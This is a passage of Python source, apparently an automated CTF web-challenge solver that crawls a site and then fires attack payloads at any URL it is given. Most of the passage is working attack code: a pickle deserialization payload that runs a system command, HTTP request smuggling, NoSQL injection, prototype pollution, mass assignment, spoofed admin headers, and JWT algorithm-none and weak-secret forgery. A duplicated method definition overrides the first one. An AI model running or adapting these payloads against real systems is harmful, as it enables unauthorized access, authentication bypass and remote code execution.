        suspect_files = []
        
        # CTF-specific keywords (high priority)
        high_priority_keywords = [
            'flag', 'secret', 'key', 'password', 'hidden', 'cipher', 'encoded',
            'morse', 'decrypt', 'encrypt', 'token', 'credential'
        ]
        
        # General suspect keywords (medium priority)
        suspect_keywords = [
            'admin', 'backup', 'config', 'auth', 'login', 'user',
            'data', 'dump', 'export', 'debug', 'test', 'dev', 'staging', 'prod',
            'api', 'internal', 'restricted', 'confidential', 'sensitive',
            'private', 'hint', 'clue', 'answer', 'puzzle', 'challenge'
        ]
        
        # Extensions that often contain hidden data in CTF
        suspect_extensions = [
            'txt', 'json', 'xml', 'yaml', 'yml', 'env', 'bak', 'backup', 'old',
            'sql', 'db', 'sqlite', 'log', 'conf', 'config', 'ini', 'key', 'pem',
            'wav', 'mp3', 'png', 'jpg', 'jpeg', 'gif', 'js', 'md'
        ]
        
        # CTF-specific file patterns (numbered files, image files that might be text, etc.)
        ctf_patterns = [
            r'image\d+\.(txt|png|jpg|jpeg)',  # image1.txt, image2.png, etc.
            r'img\d+\.(txt|png|jpg|jpeg)',
            r'file\d+\.(txt|js|html)',
            r'data\d+\.(txt|json)',
            r'part\d+\.(txt|html)',
            r'cipher\d+\.(txt|js)',
            r'flag\d*\.(txt|html|php)',
            r'secret\d*\.(txt|html)',
            r'hint\d*\.(txt|html)',
            r'clue\d*\.(txt|html)',
            r'download\.(png|txt|jpg)',
            r'output\.(png|txt|jpg)',
            r'result\.(png|txt|jpg)',
        ]
        
        all_found_paths = (
            list(extracted['pages']) + list(extracted['scripts']) + 
            list(extracted['documents']) + list(extracted['hidden_paths']) +
            list(extracted['images'])
        )
        
        for path in all_found_paths:
            path_lower = path.lower()
            filename = path.split('/')[-1].lower()
            is_suspect = False
            reason = []
            priority = 'medium'
            
            # Check for high priority keywords
            for keyword in high_priority_keywords:
                if keyword in path_lower:
                    is_suspect = True
                    reason.append(f"contains '{keyword}'")
                    priority = 'high'
                    break
            
            # Check for CTF-specific patterns (numbered files, etc.)
            for pattern in ctf_patterns:
                if re.match(pattern, filename):
                    is_suspect = True
                    reason.append("CTF pattern match")
                    if not priority == 'high':
                        priority = 'high'  # CTF patterns are high priority
                    break
            
            # Check for general suspect keywords
            if not is_suspect:
                for keyword in suspect_keywords:
                    if keyword in path_lower:
                        is_suspect = True
                        reason.append(f"contains '{keyword}'")
                        break
            
            # Check for suspect extensions
            ext = path_lower.split('.')[-1] if '.' in path_lower else ''
            if ext in suspect_extensions:
                if not is_suspect:
                    is_suspect = True
                reason.append(f".{ext} file")
            
            # Check for numbered files (often used in CTF)
            if any(c.isdigit() for c in filename):
                if ext in ['png', 'jpg', 'jpeg', 'txt', 'html', 'js']:
                    if not is_suspect:
                        is_suspect = True
                    reason.append("numbered file")
                    if 'image' in filename or 'img' in filename:
                        priority = 'high'  # Numbered image files are very suspicious
            
            # Check for download/output files
            if any(x in path_lower for x in ['download', 'output', 'result', 'export']):
                if not is_suspect:
                    is_suspect = True
                reason.append("output/download file")
                priority = 'high'
            
            if is_suspect:
                suspect_files.append({
                    'path': path,
                    'reason': ', '.join(set(reason)),  # Remove duplicates
                    'priority': priority
                })
        
        # Sort suspects by priority
        suspect_files.sort(key=lambda x: (0 if x['priority'] == 'high' else 1, x['path']))
        
        log(f"Identified {len(suspect_files)} suspect files")
        
        # Convert sets to sorted lists for output
        result_dict = {
            'base_url': extracted['base_url'],
            'pages': sorted(extracted['pages']),
            'scripts': sorted(extracted['scripts']),
            'stylesheets': sorted(extracted['stylesheets']),
            'images': sorted(extracted['images']),
            'documents': sorted(extracted['documents']),
            'api_endpoints': sorted(extracted['api_endpoints']),
            'forms': extracted['forms'],
            'links': sorted(extracted['links']),
            'directories': sorted(extracted['directories']),
            'parameters': sorted(extracted['parameters']),
            'emails': sorted(extracted['emails']),
            'subdomains': sorted(extracted['subdomains']),
            'external_links': sorted(extracted['external_links']),
            'hidden_paths': sorted(extracted['hidden_paths']),
            'robots_paths': sorted(extracted['robots_paths']),
            'sitemap_paths': sorted(extracted['sitemap_paths']),
            'suspect_files': suspect_files,  # NEW: Suspect files section
            'total_paths': len(extracted['pages']) + len(extracted['scripts']) + 
                          len(extracted['stylesheets']) + len(extracted['images']) +
                          len(extracted['directories']),
        }
        
        log(f"Extraction complete: {result_dict['total_paths']} paths found")
        return result_dict
    
    def _extract_paths_from_js(self, js_content: str) -> set:
        """Extract paths and URLs from JavaScript content"""
        paths = set()
        
        # Patterns to find paths in JS
        patterns = [
            r'["\'](/[a-zA-Z0-9_\-./]+)["\']',  # Paths in quotes
            r'href\s*=\s*["\']([^"\']+)["\']',   # href attributes
            r'src\s*=\s*["\']([^"\']+)["\']',    # src attributes
            r'url\s*:\s*["\']([^"\']+)["\']',    # url properties
            r'path\s*:\s*["\']([^"\']+)["\']',   # path properties
            r'endpoint\s*:\s*["\']([^"\']+)["\']',  # endpoint properties
            r'\.get\s*\(\s*["\']([^"\']+)["\']', # .get() calls
            r'\.post\s*\(\s*["\']([^"\']+)["\']', # .post() calls
            r'fetch\s*\(\s*["\']([^"\']+)["\']', # fetch() calls
            r'window\.location\s*=\s*["\']([^"\']+)["\']',  # redirects
            r'location\.href\s*=\s*["\']([^"\']+)["\']',    # redirects
            r'\.src\s*=\s*["\']([^"\']+)["\']',  # .src assignments
            r'["\']([^"\']+\.(?:png|jpg|jpeg|gif|svg|ico|webp))["\']',  # Image files
            r'["\']([^"\']+\.(?:js|css))["\']',  # JS/CSS files
            r'["\']([^"\']+\.(?:wav|mp3|ogg|mp4|webm))["\']',  # Media files
            r'["\']([^"\']+\.(?:json|xml|txt|html|php))["\']',  # Data files
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_content)
            for match in matches:
                # Filter out data URLs, external URLs, and common false positives
                if match.startswith('/') and not match.startswith('//'):
                    paths.add(match)
                elif match.startswith('./') or match.startswith('../'):
                    paths.add(match)
                elif '.' in match and not match.startswith('http') and not match.startswith('//'):
                    # Relative path with extension
                    if not any(x in match for x in ['unsplash.com', 'placeholder.com', 'googleapis.com']):
                        paths.add('/' + match.lstrip('./'))
        
        return paths
    
    def print_extracted_paths(self, extracted: Dict[str, Any]) -> str:
        """Format extracted paths for display"""
        output = []
        output.append(f"\n{'='*60}")
        output.append(f"Website Path Extraction Report")
        output.append(f"Base URL: {extracted['base_url']}")
        output.append(f"Total Paths Found: {extracted['total_paths']}")
        output.append(f"{'='*60}\n")
        
        sections = [
            ('Pages', 'pages'),
            ('Directories', 'directories'),
            ('Scripts (JS)', 'scripts'),
            ('Stylesheets (CSS)', 'stylesheets'),
            ('Images', 'images'),
            ('API Endpoints', 'api_endpoints'),
            ('Hidden Paths (from JS)', 'hidden_paths'),
            ('Robots.txt Paths', 'robots_paths'),
            ('Sitemap Paths', 'sitemap_paths'),
            ('Parameters', 'parameters'),
            ('Emails', 'emails'),
            ('External Links', 'external_links'),
        ]
        
        for title, key in sections:
            items = extracted.get(key, [])
            if items:
                output.append(f"\n[{title}] ({len(items)} found)")
                output.append("-" * 40)
                for item in items[:50]:  # Limit to 50 items per section
                    output.append(f"  {item}")
                if len(items) > 50:
                    output.append(f"  ... and {len(items) - 50} more")
        
        # Forms section
        forms = extracted.get('forms', [])
        if forms:
            output.append(f"\n[Forms] ({len(forms)} found)")
            output.append("-" * 40)
            for form in forms[:20]:
                output.append(f"  {form['method']} {form['action']}")
                for inp in form['inputs'][:5]:
                    output.append(f"    - {inp['name']} ({inp['type']})")
        
        return '\n'.join(output)

    # ==================== ULTRA POWER ATTACK METHODS ====================
    
    def _ultra_scan(self, url: str, result: ChallengeResult) -> str:
        """ULTRA comprehensive scan using CTF Brain analysis"""
        result.add_log("Running ULTRA scan with CTF Brain...")
        
        if not self.ctf_brain:
            return None
        
        try:
            # Fetch the page
            response = self.session.get(url, timeout=self.timeout)
            
            # Get all JS content
            soup = BeautifulSoup(response.text, 'html.parser')
            js_content = ""
            for script in soup.find_all('script'):
                if script.string:
                    js_content += script.string + "\n"
                src = script.get('src')
                if src:
                    try:
                        js_url = urljoin(url, src)
                        js_response = self.session.get(js_url, timeout=5)
                        if js_response.status_code == 200:
                            js_content += js_response.text + "\n"
                    except:
                        pass
            
            # Analyze with CTF Brain
            analysis = self.ctf_brain.analyze_challenge(response.text, js_content)
            
            result.add_log(f"CTF Brain analysis: {len(analysis['hints'])} hints, {len(analysis['patterns_detected'])} patterns")
            result.add_log(f"Suggested techniques: {analysis['suggested_techniques']}")
            
            # Try suggested techniques
            for technique in analysis['suggested_techniques']:
                if technique == 'xor_decode':
                    flag = self._try_xor_decode(analysis, result)
                    if flag:
                        return flag
                elif technique == 'base64_decode':
                    flag = self._try_base64_decode(analysis, result)
                    if flag:
                        return flag
                elif technique == 'api_fuzzing':
                    flag = self._try_api_fuzzing(url, analysis, result)
                    if flag:
                        return flag
            
            # Try vulnerability exploits
            for vuln in analysis['vulnerabilities']:
                vuln_type = vuln['type']
                result.add_log(f"Detected vulnerability: {vuln_type}")
                
                payloads = self.ctf_brain.generate_payloads(vuln_type)
                for payload in payloads[:20]:
                    flag = self._try_payload(url, payload, vuln_type, result)
                    if flag:
                        return flag
            
        except Exception as e:
            result.add_log(f"ULTRA scan error: {e}")
        
        return None
    
    def _try_xor_decode(self, analysis: Dict, result: ChallengeResult) -> str:
        """Try XOR decoding on detected fragments"""
        for fragment in analysis.get('fragments', []):
            if fragment.get('type') == 'xor':
                data = fragment.get('data', [])
                if data:
                    # Try common XOR keys
                    for key in [11, 13, 7, 42, 255, 128, 64, 32, 16, 8, 4, 2, 1, 77, 99]:
                        try:
                            decoded = ''.join(chr(n ^ key) for n in data if 0 <= (n ^ key) <= 127)
                            if decoded and all(c.isprintable() or c.isspace() for c in decoded):
                                result.add_log(f"XOR decoded (key={key}): {decoded}")
                                flag = self.extract_flag(decoded)
                                if flag:
                                    return flag
                        except:
                            pass
        return None
    
    def _try_base64_decode(self, analysis: Dict, result: ChallengeResult) -> str:
        """Try Base64 decoding on detected encodings"""
        for encoding in analysis.get('encodings_found', []):
            if encoding.get('type') == 'base64':
                data = encoding.get('data', '')
                try:
                    padded = data + '=' * (4 - len(data) % 4) if len(data) % 4 else data
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    if decoded:
                        result.add_log(f"Base64 decoded: {decoded[:50]}...")
                        flag = self.extract_flag(decoded)
                        if flag:
                            return flag
                except:
                    pass
        return None
    
    def _try_api_fuzzing(self, url: str, analysis: Dict, result: ChallengeResult) -> str:
        """Try fuzzing detected API endpoints"""
        base_url = url.rstrip('/')
        
        for endpoint in analysis.get('api_endpoints', []):
            api_url = urljoin(base_url, endpoint)
            result.add_log(f"Fuzzing API: {api_url}")
            
            # Try different methods
            for method in ['GET', 'POST', 'PUT', 'DELETE']:
                try:
                    if method == 'GET':
                        response = self.session.get(api_url, timeout=5)
                    elif method == 'POST':
                        response = self.session.post(api_url, json={}, timeout=5)
                    elif method == 'PUT':
                        response = self.session.put(api_url, json={}, timeout=5)
                    else:
                        response = self.session.delete(api_url, timeout=5)
                    
                    if response.status_code == 200:
                        flag = self.extract_flag(response.text)
                        if flag:
                            return flag
                except:
                    pass
        
        return None
    
    def _try_payload(self, url: str, payload: str, vuln_type: str, result: ChallengeResult) -> str:
        """Try a vulnerability payload"""
        try:
            # Try in URL parameters
            test_url = f"{url}?test={urllib.parse.quote(payload)}"
            response = self.session.get(test_url, timeout=5)
            flag = self.extract_flag(response.text)
            if flag:
                result.add_log(f"{vuln_type} payload successful: {payload[:30]}...")
                return flag
            
            # Try in POST data
            response = self.session.post(url, data={'input': payload}, timeout=5)
            flag = self.extract_flag(response.text)
            if flag:
                result.add_log(f"{vuln_type} POST payload successful")
                return flag
        except:
            pass
        
        return None
    
    def _test_deserialization(self, url: str, result: ChallengeResult) -> str:
        """Test for insecure deserialization vulnerabilities"""
        result.add_log("Testing deserialization vulnerabilities...")
        
        # PHP serialization payloads
        php_payloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";s:4:"test";}',
            'O:4:"User":1:{s:4:"name";s:5:"admin";}',
        ]
        
        # Python pickle payloads (base64 encoded)
        python_payloads = [
            'gASVEAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==',  # os.system('id')
        ]
        
        # Java serialization magic bytes
        java_magic = 'rO0AB'
        
        params_to_test = ['data', 'object', 'session', 'token', 'state', 'viewstate']
        
        for param in params_to_test:
            for payload in php_payloads + python_payloads:
                try:
                    response = self.session.get(url, params={param: payload}, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Deserialization on {param}")
                        return flag
                except:
                    pass
        
        return None
    
    def _test_subdomain_takeover(self, url: str, result: ChallengeResult) -> str:
        """Test for subdomain takeover vulnerabilities"""
        result.add_log("Testing subdomain takeover...")
        
        parsed = urlparse(url)
        domain = parsed.netloc
        
        # Common subdomain prefixes
        subdomains = [
            'www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging', 'test',
            'blog', 'shop', 'store', 'app', 'mobile', 'cdn', 'static',
            'assets', 'images', 'img', 'media', 'files', 'download',
            'beta', 'alpha', 'demo', 'sandbox', 'internal', 'vpn',
        ]
        
        # Check for CNAME records pointing to unclaimed services
        takeover_signatures = [
            'There is no app configured at that hostname',
            'NoSuchBucket',
            'No such app',
            'Heroku | No such app',
            'The request could not be satisfied',
            'NXDOMAIN',
            'Repository not found',
            'Sorry, this shop is currently unavailable',
        ]
        
        for sub in subdomains[:10]:  # Limit for speed
            try:
                test_url = f"{parsed.scheme}://{sub}.{domain}"
                response = self.session.get(test_url, timeout=3)
                
                for sig in takeover_signatures:
                    if sig in response.text:
                        result.add_log(f"Potential subdomain takeover: {sub}.{domain}")
                        flag = self.extract_flag(response.text)
                        if flag:
                            return flag
            except:
                pass
        
        return None
    
    def _test_http_smuggling(self, url: str, result: ChallengeResult) -> str:
        """Test for HTTP request smuggling"""
        result.add_log("Testing HTTP smuggling...")
        
        # CL.TE payload
        smuggle_payloads = [
            "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "GET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n",
        ]
        
        parsed = urlparse(url)
        
        for payload in smuggle_payloads:
            try:
                payload = payload.format(host=parsed.netloc)
                response = self.session.post(url, data=payload, timeout=5)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log("HTTP smuggling successful")
                    return flag
            except:
                pass
        
        return None
    
    def _test_web_cache_deception(self, url: str, result: ChallengeResult) -> str:
        """Test for web cache deception"""
        result.add_log("Testing web cache deception...")
        
        # Append static file extensions to dynamic URLs
        extensions = ['.css', '.js', '.png', '.jpg', '.gif', '.ico', '.svg']
        
        for ext in extensions:
            try:
                test_url = url.rstrip('/') + '/profile' + ext
                response = self.session.get(test_url, timeout=5)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log(f"Web cache deception with {ext}")
                    return flag
            except:
                pass
        
        return None

    # ==================== ULTRA PATH FINDER INTEGRATION ====================
    
    def ultra_path_scan(self, url: str, result: ChallengeResult = None) -> Dict[str, Any]:
        """
        Perform ULTRA comprehensive path scanning on a website
        
        Args:
            url: Target URL to scan
            result: Optional ChallengeResult for logging
            
        Returns:
            Dictionary with all discovered paths and resources
        """
        if result:
            result.add_log("Starting ULTRA Path Scan...")
        
        try:
            from .pathfinder import UltraPathFinder
            
            finder = UltraPathFinder(
                session=self.session,
                timeout=self.timeout,
                max_threads=20,
                max_depth=3
            )
            
            def log_callback(msg):
                if result:
                    result.add_log(msg)
                else:
                    print(msg)
            
            # Run comprehensive scan
            paths_result = finder.find_all_paths(url, callback=log_callback)
            
            # Print formatted results
            formatted = finder.print_results(paths_result)
            if result:
                result.add_log(formatted)
            else:
                print(formatted)
            
            return paths_result
            
        except ImportError as e:
            error_msg = f"UltraPathFinder not available: {e}"
            if result:
                result.add_log(error_msg)
            else:
                print(error_msg)
            return {}
        except Exception as e:
            error_msg = f"ULTRA Path Scan error: {e}"
            if result:
                result.add_log(error_msg)
            else:
                print(error_msg)
            return {}
    
    def find_all_website_paths(self, url: str) -> Dict[str, Any]:
        """
        Convenience method to find ALL paths on a website
        
        Args:
            url: Target URL
            
        Returns:
            Dictionary with all discovered paths
        """
        return self.ultra_path_scan(url)

    
    # ==================== ADVANCED ENHANCEMENTS ====================
    
    def _test_header_injection(self, url: str, result: ChallengeResult) -> str:
        """Test for header injection and manipulation attacks"""
        result.add_log("Testing header injection attacks...")
        
        try:
            # Test custom headers that might reveal flags
            custom_headers = {
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
                'X-Host': 'localhost',
                'X-Forwarded-Host': 'localhost',
                'X-Admin': 'true',
                'X-Role': 'admin',
                'X-Auth': 'true',
                'X-Authenticated': 'true',
                'X-User': 'admin',
                'X-Username': 'admin',
                'X-Access-Level': '999',
                'X-Privilege': 'admin',
                'X-Debug': 'true',
                'X-Test': 'true',
                'X-Dev': 'true',
                'X-Development': 'true',
            }
            
            for header_name, header_value in custom_headers.items():
                try:
                    response = self.session.get(url, headers={header_name: header_value}, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Header injection successful: {header_name}={header_value}")
                        return flag
                    
                    # Check for elevated access indicators
                    if any(keyword in response.text.lower() for keyword in ['admin', 'dashboard', 'secret', 'flag', 'congratulations', 'success']):
                        flag = self.extract_flag(response.text)
                        if flag:
                            return flag
                except:
                    pass
            
            # Test Host header manipulation
            parsed = urlparse(url)
            host_variations = ['localhost', '127.0.0.1', 'admin.local', 'internal', 'dev.local']
            for host in host_variations:
                try:
                    response = self.session.get(url, headers={'Host': host}, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Host header manipulation successful: {host}")
                        return flag
                except:
                    pass
        except:
            pass
        
        return None
    
    def _test_api_fuzzing(self, url: str, result: ChallengeResult) -> str:
        """Advanced API endpoint fuzzing and parameter discovery"""
        result.add_log("Testing API fuzzing...")
        
        try:
            base_url = url.rstrip('/')
            
            # Common API endpoints
            api_endpoints = [
                '/api/flag', '/api/secret', '/api/admin', '/api/user',
                '/api/v1/flag', '/api/v1/secret', '/api/v1/admin',
                '/api/v2/flag', '/api/v2/secret',
                '/v1/flag', '/v2/flag', '/v3/flag',
                '/rest/flag', '/rest/secret', '/rest/admin',
                '/graphql', '/api/graphql',
                '/.well-known/flag', '/.well-known/secret',
            ]
            
            for endpoint in api_endpoints:
                try:
                    # Try GET
                    response = self.session.get(base_url + endpoint, timeout=5)
                    if response.status_code == 200:
                        flag = self.extract_flag(response.text)
                        if flag:
                            result.add_log(f"Found flag at API endpoint: {endpoint}")
                            return flag
                        
                        # Try parsing JSON
                        try:
                            data = response.json()
                            flag = self._search_json_for_flag(data, result)
                            if flag:
                                return flag
                        except:
                            pass
                    
                    # Try POST with common parameters
                    post_data = {'admin': 'true', 'role': 'admin', 'user': 'admin'}
                    response = self.session.post(base_url + endpoint, json=post_data, timeout=5)
                    if response.status_code == 200:
                        flag = self.extract_flag(response.text)
                        if flag:
                            result.add_log(f"Found flag at API POST: {endpoint}")
                            return flag
                except:
                    pass
            
            # Test parameter pollution
            common_params = ['id', 'user', 'admin', 'role', 'access', 'level', 'privilege']
            for param in common_params:
                try:
                    # Array parameter pollution
                    response = self.session.get(url, params={param: ['1', 'admin']}, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Parameter pollution successful: {param}")
                        return flag
                except:
                    pass
        except:
            pass
        
        return None
    
    def _test_encoding_chains(self, url: str, result: ChallengeResult) -> str:
        """Detect and decode multi-layer encoding chains"""
        result.add_log("Testing encoding chains...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all scripts
            for script in soup.find_all('script'):
                if script.string:
                    content = script.string
                    
                    # Look for multi-encoded strings
                    # Pattern: Base64 -> Hex -> Base64 -> Flag
                    b64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
                    matches = re.findall(b64_pattern, content)
                    
                    for match in matches:
                        # Try decoding chains
                        decoded = match
                        for _ in range(5):  # Try up to 5 layers
                            try:
                                # Try Base64
                                new_decoded = base64.b64decode(decoded).decode('utf-8', errors='ignore')
                                if new_decoded and new_decoded != decoded:
                                    decoded = new_decoded
                                    flag = self.extract_flag(decoded)
                                    if flag:
                                        result.add_log(f"Found flag in encoding chain (Base64)")
                                        return flag
                                    continue
                            except:
                                pass
                            
                            try:
                                # Try Hex
                                new_decoded = bytes.fromhex(decoded).decode('utf-8', errors='ignore')
                                if new_decoded and new_decoded != decoded:
                                    decoded = new_decoded
                                    flag = self.extract_flag(decoded)
                                    if flag:
                                        result.add_log(f"Found flag in encoding chain (Hex)")
                                        return flag
                                    continue
                            except:
                                pass
                            
                            try:
                                # Try URL decode
                                new_decoded = urllib.parse.unquote(decoded)
                                if new_decoded and new_decoded != decoded:
                                    decoded = new_decoded
                                    flag = self.extract_flag(decoded)
                                    if flag:
                                        result.add_log(f"Found flag in encoding chain (URL)")
                                        return flag
                                    continue
                            except:
                                pass
                            
                            # No more decoding possible
                            break
        except:
            pass
        
        return None
    
    def _test_race_conditions(self, url: str, result: ChallengeResult) -> str:
        """Test for race condition vulnerabilities"""
        result.add_log("Testing race conditions...")
        
        try:
            # Send multiple concurrent requests
            import concurrent.futures
            
            def make_request():
                try:
                    response = self.session.get(url, timeout=5)
                    return response.text
                except:
                    return None
            
            # Send 10 concurrent requests
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(make_request) for _ in range(10)]
                results = [f.result() for f in concurrent.futures.as_completed(futures)]
            
            # Check all responses for flags
            for response_text in results:
                if response_text:
                    flag = self.extract_flag(response_text)
                    if flag:
                        result.add_log("Race condition exploit successful")
                        return flag
        except:
            pass
        
        return None
    
    def _test_prototype_pollution(self, url: str, result: ChallengeResult) -> str:
        """Test for JavaScript prototype pollution"""
        result.add_log("Testing prototype pollution...")
        
        try:
            # Prototype pollution payloads
            pollution_payloads = [
                {'__proto__[admin]': 'true'},
                {'__proto__[isAdmin]': 'true'},
                {'__proto__[role]': 'admin'},
                {'constructor[prototype][admin]': 'true'},
                {'constructor[prototype][isAdmin]': 'true'},
            ]
            
            for payload in pollution_payloads:
                try:
                    # Try GET with pollution
                    response = self.session.get(url, params=payload, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Prototype pollution successful: {payload}")
                        return flag
                    
                    # Try POST with pollution
                    response = self.session.post(url, json=payload, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Prototype pollution POST successful: {payload}")
                        return flag
                except:
                    pass
        except:
            pass
        
        return None
    
    def _test_mass_assignment(self, url: str, result: ChallengeResult) -> str:
        """Test for mass assignment vulnerabilities"""
        result.add_log("Testing mass assignment...")
        
        try:
            # Mass assignment payloads
            mass_assign_payloads = [
                {'admin': True, 'isAdmin': True, 'role': 'admin'},
                {'admin': 'true', 'isAdmin': 'true', 'role': 'admin'},
                {'user': {'admin': True, 'role': 'admin'}},
                {'profile': {'admin': True, 'role': 'admin'}},
                {'permissions': ['admin', 'read', 'write', 'delete']},
                {'access_level': 999, 'privilege': 'admin'},
            ]
            
            for payload in mass_assign_payloads:
                try:
                    # Try POST
                    response = self.session.post(url, json=payload, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Mass assignment successful")
                        return flag
                    
                    # Try PUT
                    response = self.session.put(url, json=payload, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Mass assignment PUT successful")
                        return flag
                except:
                    pass
        except:
            pass
        
        return None
    
    def _test_nosql_injection(self, url: str, result: ChallengeResult) -> str:
        """Test for NoSQL injection vulnerabilities"""
        result.add_log("Testing NoSQL injection...")
        
        try:
            # NoSQL injection payloads
            nosql_payloads = [
                {'username': {'$ne': None}, 'password': {'$ne': None}},
                {'username': {'$gt': ''}, 'password': {'$gt': ''}},
                {'username': 'admin', 'password': {'$ne': ''}},
                {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
                {'$where': '1==1'},
                {'$or': [{'admin': True}, {'admin': False}]},
            ]
            
            for payload in nosql_payloads:
                try:
                    # Try POST
                    response = self.session.post(url, json=payload, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"NoSQL injection successful")
                        return flag
                except:
                    pass
        except:
            pass
        
        return None
    
    def _test_deserialization(self, url: str, result: ChallengeResult) -> str:
        """Test for insecure deserialization"""
        result.add_log("Testing deserialization attacks...")
        
        try:
            # Look for serialized data in cookies or parameters
            for cookie in self.session.cookies:
                # Check if cookie looks like serialized data
                if any(marker in cookie.value for marker in ['O:', 'a:', 's:', 'rO0', 'aced']):
                    result.add_log(f"Found potential serialized data in cookie: {cookie.name}")
                    
                    # Try to manipulate it
                    # This is a simplified check - real exploitation would be more complex
                    try:
                        # Try base64 decode
                        decoded = base64.b64decode(cookie.value)
                        if b'admin' in decoded or b'user' in decoded:
                            result.add_log(f"Cookie {cookie.name} contains serialized user data")
                    except:
                        pass
        except:
            pass
        
        return None

    # ==================== ULTRA ENHANCED JWT/BASE64/COOKIE/HEADER ATTACKS ====================
    
    def _ultra_jwt_attack(self, url: str, result: ChallengeResult) -> str:
        """ULTRA ENHANCED JWT attack with all known techniques"""
        result.add_log("Running ULTRA JWT attack suite...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Find ALL JWT tokens everywhere
            jwt_tokens = self._find_all_jwt_tokens(response, result)
            
            for token_source, token in jwt_tokens:
                result.add_log(f"Found JWT from {token_source}: {token[:50]}...")
                
                # Decode and analyze
                jwt_data = CTFDecoder.decode_jwt(token)
                if not jwt_data:
                    continue
                
                header = jwt_data.get('header', {})
                payload = jwt_data.get('payload', {})
                
                result.add_log(f"JWT Algorithm: {header.get('alg', 'unknown')}")
                result.add_log(f"JWT Payload keys: {list(payload.keys())}")
                
                # ATTACK 1: Check payload for flags directly
                flag = self._check_jwt_payload_for_flag(payload, result)
                if flag:
                    return flag
                
                # ATTACK 2: Algorithm confusion (none, None, NONE, nOnE)
                for alg_variant in ['none', 'None', 'NONE', 'nOnE', '']:
                    modified = self._jwt_alg_confusion(token, alg_variant, result)
                    if modified:
                        flag = self._test_jwt_token(url, token_source, modified, result)
                        if flag:
                            return flag
                
                # ATTACK 3: Algorithm switch (RS256 -> HS256)
                if header.get('alg', '').startswith('RS'):
                    modified = self._jwt_rs_to_hs_attack(token, url, result)
                    if modified:
                        flag = self._test_jwt_token(url, token_source, modified, result)
                        if flag:
                            return flag
                
                # ATTACK 4: Weak secret brute force
                for secret in self.JWT_WEAK_SECRETS:
                    modified = self._jwt_forge_with_secret(token, secret, payload, result)
                    if modified:
                        flag = self._test_jwt_token(url, token_source, modified, result)
                        if flag:
                            result.add_log(f"JWT cracked with secret: {secret}")
                            return flag
                
                # ATTACK 5: Key ID (kid) injection
                modified = self._jwt_kid_injection(token, result)
                if modified:
                    flag = self._test_jwt_token(url, token_source, modified, result)
                    if flag:
                        return flag
                
                # ATTACK 6: JKU/X5U header injection
                modified = self._jwt_jku_injection(token, url, result)
                if modified:
                    flag = self._test_jwt_token(url, token_source, modified, result)
                    if flag:
                        return flag
        except Exception as e:
            result.add_log(f"JWT attack error: {e}")
        
        return None

    def _find_all_jwt_tokens(self, response, result: ChallengeResult) -> list:
        """Find JWT tokens from ALL possible sources"""
        tokens = []
        
        # Source 1: Cookies
        for cookie in self.session.cookies:
            if self._is_jwt(cookie.value):
                tokens.append((f"cookie:{cookie.name}", cookie.value))
        
        # Source 2: Response headers
        for header_name in ['Authorization', 'X-Auth-Token', 'X-Access-Token', 'X-JWT', 'Token']:
            header_value = response.headers.get(header_name, '')
            if 'Bearer ' in header_value:
                token = header_value.replace('Bearer ', '').strip()
                if self._is_jwt(token):
                    tokens.append((f"header:{header_name}", token))
            elif self._is_jwt(header_value):
                tokens.append((f"header:{header_name}", header_value))
        
        # Source 3: Response body (JSON)
        try:
            data = response.json()
            jwt_keys = ['token', 'jwt', 'access_token', 'accessToken', 'auth_token', 
                       'authToken', 'id_token', 'idToken', 'refresh_token', 'bearer']
            for key in jwt_keys:
                if key in data and isinstance(data[key], str) and self._is_jwt(data[key]):
                    tokens.append((f"json:{key}", data[key]))
        except:
            pass
        
        # Source 4: Response body (regex search)
        jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
        matches = re.findall(jwt_pattern, response.text)
        for match in matches:
            if self._is_jwt(match) and (f"body", match) not in tokens:
                tokens.append((f"body", match))
        
        # Source 5: localStorage/sessionStorage patterns in JS
        storage_pattern = r'(?:localStorage|sessionStorage)\.(?:setItem|getItem)\s*\(\s*[\'"]([^\'"]+)[\'"]\s*,?\s*[\'"]?(eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*)'
        matches = re.findall(storage_pattern, response.text)
        for key, token in matches:
            if self._is_jwt(token):
                tokens.append((f"storage:{key}", token))
        
        result.add_log(f"Found {len(tokens)} JWT tokens")
        return tokens

    def _check_jwt_payload_for_flag(self, payload: dict, result: ChallengeResult) -> str:
        """Check JWT payload for flags with deep inspection"""
        for key, value in payload.items():
            if isinstance(value, str):
                # Direct flag check
                flag = self.extract_flag(value)
                if flag:
                    result.add_log(f"Found flag in JWT payload key: {key}")
                    return flag
                
                # Base64 decode attempt
